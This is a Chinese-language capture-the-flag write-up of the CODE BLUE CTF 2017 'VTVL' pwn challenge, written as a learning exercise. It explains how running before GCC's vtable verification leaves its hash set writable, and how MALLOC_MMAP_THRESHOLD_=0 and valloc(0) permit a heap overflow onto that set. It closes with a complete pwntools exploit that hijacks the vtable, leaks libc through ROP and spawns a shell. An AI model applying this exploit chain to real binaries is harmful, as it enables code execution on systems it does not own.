## CODE BLUE CTF 2017 / Vertical Takeoff Vertical landing

今天集训的第二次比赛出题aFang找的题目，第一次接触到这个难度级别，学到了很多，感觉很爽~

这题主要考察了VTV校验的绕过

可能需要先配置环境将libvtv.so.0复制到/lib/下即可

### 源码

```c++
/*
    g++ vtvl.cpp -o vtvl -std=c++11 -Wl,-s -Wl,-z,relro,-z,now -fstack-protector-all -fvtable-verify=std -static-libstdc++
 */

#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <cinttypes>
#include <unistd.h>
#include <errno.h>
using namespace std;

#define myprintf(s) write(1, (s), strlen((s)))
#define myputs(s) write(1, (s "\n"), strlen((s "\n")))

void recvlen(char *buf, size_t n) {
  ssize_t rc;

  while (n--) {
    rc = read(0, buf, 1);
    if (rc == 0) return;
    if (rc == -1) {
      if (errno == EAGAIN || errno == EINTR) {
        continue;
      }
      return;
    }

    if (*buf == '\n') {
      *buf = '\0';
      return;
    }

    buf++;
  }
}

uint64_t GetInt() {
  char buf[0x20] = "";
  recvlen(buf, 0x1f);
  return strtoull(buf, NULL, 10);
}

class Rocket {
public:
  static void *operator new(size_t size, void *buf) { return buf; }
  static void operator delete(void *p, void *buf) {}
  virtual void Operate(uint8_t *op, uint64_t size) {
    uint64_t i;
    int64_t x = 0;
    int64_t y = 100;

    for (i=0; i<size; i++) {
      switch (op[i]) {
      case 'D':
        y--;
        break;
      case 'L':
        x--;
        break;
      case 'R':
        x++;
        break;
      default:
        exit(-1);
      }
    }

    if (x == 0 && y == 0) myputs("The rocket landed successfully.");
    else myputs("Failed.");
  }
};

class UnusedRocket : public Rocket {
  void Operate(uint8_t *op, uint64_t size) {}
};

void ReadLine(char *buf) {
  ssize_t rc;
  while (1) {
    rc = read(0, buf, 1);
    if (rc == 0) break;
    if (rc == -1) {
      if (errno == EAGAIN || errno == EINTR) continue;
      return;
    }

    if (*buf == '\n') {
      *buf = '\0';
      break;
    }
    buf++;
  }
}

char *name;
Rocket *rocket;
char name_dup[64];

void print_banner(void) {
  myputs("                                                                ");
  myputs(" ▄               ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄               ▄  ▄           ");
  myputs("▐░▌             ▐░▌▐░░░░░░░░░░░▌▐░▌             ▐░▌▐░▌          ");
  myputs(" ▐░▌           ▐░▌  ▀▀▀▀█░█▀▀▀▀  ▐░▌           ▐░▌ ▐░▌          ");
  myputs("  ▐░▌         ▐░▌       ▐░▌       ▐░▌         ▐░▌  ▐░▌          ");
  myputs("   ▐░▌       ▐░▌        ▐░▌        ▐░▌       ▐░▌   ▐░▌          ");
  myputs("    ▐░▌     ▐░▌         ▐░▌         ▐░▌     ▐░▌    ▐░▌          ");
  myputs("     ▐░▌   ▐░▌          ▐░▌          ▐░▌   ▐░▌     ▐░▌          ");
  myputs("      ▐░▌ ▐░▌           ▐░▌           ▐░▌ ▐░▌      ▐░▌          ");
  myputs("       ▐░▐░▌            ▐░▌            ▐░▐░▌       ▐░█▄▄▄▄▄▄▄▄▄ ");
  myputs("        ▐░▌             ▐░▌             ▐░▌        ▐░░░░░░░░░░░▌");
  myputs("         ▀               ▀               ▀          ▀▀▀▀▀▀▀▀▀▀▀ ");
  myputs("                                                                ");
}

void service(void) __attribute__((constructor(100)));
void service(void) {
  uint64_t i;
  uint64_t size;
  rocket = new (alloca(sizeof(Rocket))) Rocket;
  name = (char*)alloca(64);

  print_banner();
  myputs("**** Welcome to VTVl(Vertical Takeoff Vertical landing) simulator! ****\n");
  myprintf("Your name: ");
  ReadLine(name);
  memcpy(name_dup, name, 64);
  myprintf("Hi, ");
  myprintf(name);
  myputs("!\n");

  myprintf("Size of operation: ");
  size = GetInt();
  uint8_t *ptr = (uint8_t*)valloc(size+1);
  if (!ptr) {
    myputs("Couldn't allocate the requested size.");
    exit(-1);
  }

  recvlen((char*)ptr, size);
  rocket->Operate(ptr, size);
  myputs("Bye.");
  exit(0);
}

int main(void) {
// We decided to provide no hint or no help in order to adjust the difficulty.
/*  myputs("Hint: see _init_array.");
  myputs("And for simplicity, you may use this if you can.");
  execl("/bin/sh", "/bin/sh", NULL);*/
}
```

### 防护机制

```bash
➜  vtvl_chall pwn checksec vtvl
[*] '/home/d1nn3r/Desktop/vtvl_chall/vtvl'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

这题main函数里没有东西，`server`函数设置了`__attribute__((constructor(100)));`,而用`valloc`函数代替了`malloc`，这些都是关键点

首先`__attribute__((constructor(100)));`是设置优先级的，一般0-100都是不用的，这里设置为100，可以查vtv的源码 https://github.com/gcc-mirror/gcc/blob/master/libgcc/vtv_end.c 

```c
#include "vtv-change-permission.h"

__attribute__ ((constructor(100))) void
__VLTprotect (void)
{
    __VLTChangePermission (__VLTP_READ_ONLY);
}

/* Page-sized variable to mark end of .vtable_map_vars section.  */
char _vtable_map_vars_end[VTV_PAGE_SIZE]
  __attribute__ ((__visibility__ ("protected"), used,
        section(".vtable_map_vars")));
```

VTV也是设置的100所以`server`可能在`__VLTprotect `之前执行，从二进制文件的.init_array中也能看到

```asm
.init_array:0000000000602C18 _init_array     segment para public 'DATA' use64
.init_array:0000000000602C18                 assume cs:_init_array
.init_array:0000000000602C18                 ;org 602C18h
.init_array:0000000000602C18 off_602C18      dq offset __VLTunprotect
.init_array:0000000000602C18                                         ; DATA XREF: LOAD:00000000004000F8↑o
.init_array:0000000000602C18                                         ; LOAD:0000000000400210↑o ...
.init_array:0000000000602C20                 dq offset sub_40108D
.init_array:0000000000602C28                 dq offset sub_400E20   ;server
.init_array:0000000000602C30                 dq offset __VLTprotect
.init_array:0000000000602C38                 dq offset sub_400B10
.init_array:0000000000602C38 _init_array     ends
```

这样就会导致原本一些只读的的页，在这种情况下变成了可写，详细可以看VTV的源码 https://github.com/gcc-mirror/gcc/blob/master/libvtv/vtv_rts.cc 

这又有什么用呢？

VTV中有一个hash_map_set，负责管理vtable的，这个set的地址可以通过`.vtable_map_vars`节读取到

```bash
gdb-peda$ x /10xg 0x604000
0x604000:	0x00007ffff7ff5050	0x0000000000000000     <-----
0x604010:	0x0000000000000000	0x0000000000000000         |
0x604020:	0x0000000000000000	0x0000000000000000         |
0x604030:	0x0000000000000000	0x0000000000000000         |
0x604040:	0x0000000000000000	0x0000000000000000         |
gdb-peda$ x /10xg 0x00007ffff7ff5050                        |    ；hash_sets
0x7ffff7ff5050:	0x0000000000000004	0x0000000000000001     |
0x7ffff7ff5060:	0x0000000000000001	0x0000000000401e40  <----
0x7ffff7ff5070:	0x0000000000000001	0x0000000000000001      |
0x7ffff7ff5080:	0x0000000000000000	0x0000000000000000      |
0x7ffff7ff5090:	0x0000000000000000	0x0000000000000000      |
gdb-peda$ x /10xg 0x0000000000401e40                        |
0x401e40:	0x0000000000401128	0x0000000000602c78   <------
0x401e50:	0x0000000000401e58	0x0074656b636f5236         |
0x401e60:	0x7878635f5f30314e	0x5f37313176696261         |
0x401e70:	0x745f7373616c635f	0x6f666e695f657079         |
0x401e80:	0x0000000000000045	0x0000000000000000         |
gdb-peda$ x /10i 0x0000000000401128               <---------|
   0x401128:	push   rbp
   0x401129:	mov    rbp,rsp
   0x40112c:	sub    rsp,0x40
   0x401130:	mov    QWORD PTR [rbp-0x28],rdi
   0x401134:	mov    QWORD PTR [rbp-0x30],rsi
   0x401138:	mov    QWORD PTR [rbp-0x38],rdx
   0x40113c:	mov    rax,QWORD PTR fs:0x28
   0x401145:	mov    QWORD PTR [rbp-0x8],rax
   0x401149:	xor    eax,eax
   0x40114b:	mov    QWORD PTR [rbp-0x18],0x0
```

这里面就存有vtable的地址，最终指向要执行的函数

在VTV中会经常对vtable做检验，校验用的就是这个set，参考https://github.com/gcc-mirror/gcc/blob/da8dff89fa9398f04b107e388cb706517ced9505/libvtv/vtv_set.h

```C++
template <typename Key, class HashFcn, class Alloc>
class insert_only_hash_sets
{
 public:
  typedef Key key_type;
  typedef size_t size_type;
  typedef Alloc alloc_type;
  enum { illegal_key = 1 };
  enum { min_capacity = 4 };
#if HASHTABLE_STATS
  enum { stats = true };
#else
  enum { stats = false };
#endif
    
...   
 
template <typename Key, class HashFcn, class Alloc>
void
insert_only_hash_sets<Key, HashFcn,
                                 Alloc>::insert_only_hash_set::insert_no_resize
                                                                 (key_type key)
{
  HashFcn hasher;
  const size_type capacity = num_buckets;
  VTV_DEBUG_ASSERT (capacity >= min_capacity);    
  VTV_DEBUG_ASSERT (!is_reserved_key (key));
  size_type index = hasher (key) & (capacity - 1);    //让capacity=1即可得到固定值0
  key_type k = key_at_index (index);
  size_type indices_examined = 0;
  while (k != key)
    {
      ++indices_examined;
      if (k == (key_type) illegal_key)
        {
          key_at_index (index) = key;
          ++num_entries;
          return;
        }
      else
	{
	  inc_by (stat_insert_found_hash_collision,
		  hasher (k) == hasher (key));
	}
      VTV_DEBUG_ASSERT (indices_examined < capacity);
      index = next_index (index, indices_examined);
      k = key_at_index (index);
    }
}
```

所以改掉这个set中的地址并且绕过校验，就可以修改vtable了

这里面绕过的技巧就是让capacity=1(默认为4)即可得到固定值0，就能得到一个固定的位置，如下

```bash
gdb-peda$ x /30xg 0x00007efe99daa050
0x7efe99daa050:	0x0000000000000001	0x0000000000000001
0x7efe99daa060:	0x0000000000605060	0x0000000000000001
0x7efe99daa070:	0x0000000000000001	0x0000000000000001
```

当然还有一个方法就是各个位置都试一遍，一共也没几个= =，不过需要注意每次地址变化时，位置都不一样，具体怎么变化的算法目前还是不懂。。。太菜了.jpg

那么现在还有个问题就是这个在`__VLTprotect `时用到了`mprotect`，所以肯定是mmap出来的，那么我们也申请的内存也必须是mmap,在`malloc`时大小是要超过MMAP_THRESHOLD  bytes才能出发mmap（默认0x20000），而且一般mmap的地址到不了那么高的地址，这又该怎么办呢？

`valloc`在这里起作用了，当输入-1，即`valloc(0)`的时候如果mmap，就会在距离set固定偏移（不同内核偏移不同）的mmap一段内存，并且还可以进行overflow

但是一般`valloc(0)`是不会触发mmap的，不过可以通过读glibc源码

```C
void *
__libc_valloc (size_t bytes)
{
  if (__malloc_initialized < 0)
    ptmalloc_init ();

  void *address = RETURN_ADDRESS (0);
  size_t pagesize = GLRO (dl_pagesize);
  return _mid_memalign (pagesize, bytes, address);
}

_init
ptmalloc_init (void)
{
  if (__malloc_initialized >= 0)
    return;

  __malloc_initialized = 0;

#ifdef SHARED
  /* In case this libc copy is in a non-default namespace, never use brk.
     Likewise if dlopened from statically linked program.  */
  Dl_info di;
  struct link_map *l;

  if (_dl_open_hook != NULL
      || (_dl_addr (ptmalloc_init, &di, &l, NULL) != 0
          && l->l_ns != LM_ID_BASE))
    __morecore = __failing_morecore;
#endif

  thread_arena = &main_arena;
  const char *s = NULL;
  if (__glibc_likely (_environ != NULL))
    {
      char **runp = _environ;
      char *envline;

      while (__builtin_expect ((envline = next_env_entry (&runp)) != NULL,
                               0))
        {
          size_t len = strcspn (envline, "=");

          if (envline[len] != '=')
            /* This is a "MALLOC_" variable at the end of the string
               without a '=' character.  Ignore it since otherwise we
               will access invalid memory below.  */
            continue;

          switch (len)
            {
            case 6:
              if (memcmp (envline, "CHECK_", 6) == 0)
                s = &envline[7];
              break;
            case 8:
              if (!__builtin_expect (__libc_enable_secure, 0))
                {
                  if (memcmp (envline, "TOP_PAD_", 8) == 0)
                    __libc_mallopt (M_TOP_PAD, atoi (&envline[9]));
                  else if (memcmp (envline, "PERTURB_", 8) == 0)
                    __libc_mallopt (M_PERTURB, atoi (&envline[9]));
                }
              break;
            case 9:
              if (!__builtin_expect (__libc_enable_secure, 0))
                {
                  if (memcmp (envline, "MMAP_MAX_", 9) == 0)
                    __libc_mallopt (M_MMAP_MAX, atoi (&envline[10]));
                  else if (memcmp (envline, "ARENA_MAX", 9) == 0)
                    __libc_mallopt (M_ARENA_MAX, atoi (&envline[10]));
                }
              break;
            case 10:
              if (!__builtin_expect (__libc_enable_secure, 0))
                {
                  if (memcmp (envline, "ARENA_TEST", 10) == 0)
                    __libc_mallopt (M_ARENA_TEST, atoi (&envline[11]));
                }
              break;
            case 15:
              if (!__builtin_expect (__libc_enable_secure, 0))
                {
                  if (memcmp (envline, "TRIM_THRESHOLD_", 15) == 0)
                    __libc_mallopt (M_TRIM_THRESHOLD, atoi (&envline[16]));
                  else if (memcmp (envline, "MMAP_THRESHOLD_", 15) == 0)
                    __libc_mallopt (M_MMAP_THRESHOLD, atoi (&envline[16]));
                }
              break;
            default:
              break;
            }
        }
    }
  if (s && s[0])
    {
      __libc_mallopt (M_CHECK_ACTION, (int) (s[0] - '0'));
      if (check_action != 0)
        __malloc_check_init ();
    }
  void (*hook) (void) = atomic_forced_read (__malloc_initialize_hook);
  if (hook != NULL)
    (*hook)();
  __malloc_initialized = 1;
}
```

可以发现当环境变量MALLOC_MMAP_THRESHOLD_=0时，就可以触发mmap，进而就可以完成这一连串的利用

### 总结利用步骤

- 通过栈溢出设置环境变量MALLOC_MMAP_THRESHOLD_=0
- `valloc(0)`触发mmap，利用堆溢出覆盖VTV的hash map set
- 修改vtable，接触控制流，构造ROP链（需要栈迁移）get shell

注：构造ROP链的时候需要注意避开一些栈上必要的变量信息，利用pop ret,add rsp等gadget跳过即可构造任意长度ROP链（PS：这地方坑了我半天，写ROP还是太渣了QAQ）



exp如下

```python
#!/usr/bin/env python
#  -*-coding:utf-8-*-
from pwn import *
import time
import os

#lambs:
wait = lambda x: raw_input(x)

#context.log_level='debug'


pop_rsp=0x401333

p_ret =0x401293
pp_ret=0x401331

addesp_8 = 0x400986
addesp_24 = 0x401441
addesp_28 = 0x40138d
addesp_36 = 0x401290
#addesp_40 = 0x401543
addesp_48 = 0x40166a

addesp_40 = 0x40128f
p = process('./vtvl')

p.recv(2048)

#payload="MMAP_THRESHOLD_=0\0"+'A'*0x3e+p64(0x401e40)+'A'*0x18+p64(0x605040)
gadget = p64(pp_ret)+p64(p_ret)+p64(0)+p64(addesp_40)

payload= gadget    #p64(0x400cee)   #0x605060   hijack

payload=payload.ljust(0x28,'A')
payload+="MALLOC_MMAP_THRESHOLD_=0" #0x605080

gadget2=p64(0)+p64(addesp_24)

payload+=gadget2

payload=payload.ljust(0x50,'A')
payload+=p64(0x605060)   #0x401e40  vtable

gadget3=p64(0)+p64(0)+p64(addesp_24)

payload+=gadget3

pop_rid = 0x401551
pop_rbx_rbp_r12_r13_r14_r15 = 0x4017CA
magic = 0x4017B0

bss = 0x605020

elf = ELF('./vtvl')

write_plt = elf.plt['write']
write_got = elf.got['write']

read_got = elf.got['read']

pop_rbp = 0x400aa0

leave = 0x400be3

xor_eax = 0x4016f0

rop=p64(0)*3+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(magic)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0x8)+p64(bss)+p64(0)+p64(magic)+p64(0)*7+p64(xor_eax)+p64(pop_rsp)+p64(bss)

payload+=rop

payload=payload.ljust(0x1d8,'A')
payload+=p64(0x605088)  #env


wait('start')
p.sendline(payload)
#gdb.attach(p)
wait('stack overflow')

p.recv(2048)
p.sendline(str('-1'))

payload2="\x00"*0xa050+p64(0x4)+p64(0x605060)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x1)
payload3="\x00"*0xa050+p64(0x4)+p64(0x1)+p64(0x605060)+p64(0x1)+p64(0x1)+p64(0x1)
payload4="\x00"*0xa050+p64(0x4)+p64(0x1)+p64(0x1)+p64(0x605060)+p64(0x1)+p64(0x1)
payload5="\x00"*0xa050+p64(0x4)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x605060)+p64(0x1)
payload6="A"*0xa050+p64(0x4)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x605060)


payload7="A"*0xa050+p64(0x1)+p64(0x1)+p64(0x605060)+p64(0x1)+p64(0x1)+p64(0x1)

p.sendline(payload7)
wait('hijack')
write_addr = u64(p.recv().rjust(8,'\x00'))
log.success("write_addr:%#x" % write_addr)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadget = write_addr - libc.symbols['write'] + 0x45216

log.success("one_gadget:%#x" % one_gadget)


p.send(p64(one_gadget))

wait('get shell!')


p.interactive()
```





### 总结

感受到了pwn的博大精深，要不是因为出题，之前根本不会接触这方面的知识，学到了很多，还磨炼了各种调试的技巧和读源码的能力，总之收获很多~~不过和其他大佬相比还是太菜了QAQ还需要继续努力啊~加油！
